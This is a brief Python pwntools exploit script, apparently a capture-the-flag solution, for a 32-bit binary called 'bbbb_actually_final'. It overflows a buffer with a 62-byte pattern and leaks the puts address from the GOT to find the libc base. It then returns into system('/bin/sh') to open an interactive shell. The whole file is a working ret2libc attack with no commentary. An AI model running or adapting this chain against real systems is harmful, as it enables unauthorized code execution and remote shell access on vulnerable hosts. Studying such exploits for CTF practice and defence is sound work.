from pwn import *

log.info("Iniciando el hackeo.")

remoteflag = 1
IP = 'localhost'    # change this
PORT = 7889         # change this
FILENAME = "./bbbb_actually_final"
if remoteflag:
    io = remote(IP, PORT)
else:
    io = process(FILENAME)

elf = context.binary = ELF(FILENAME)

io.recvline()

payload = b''
payload += cyclic(62)

putsleak = flat(elf.sym.puts-1, elf.sym.main, elf.got.puts)

payload += putsleak
io.sendline(payload)

libc_leak = unpack(io.recv(4))
log.hexdump(libc_leak)

#libc = ELF('./libc-2.27.so')
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so')
base = libc_leak - libc.sym.puts

sys = base + libc.sym.system
binsh = base + next(libc.search(b'/bin/sh\x00'))

payload = cyclic(62)
payload += flat(sys, "JUNK", binsh)

io.sendline(payload)
io.interactive()
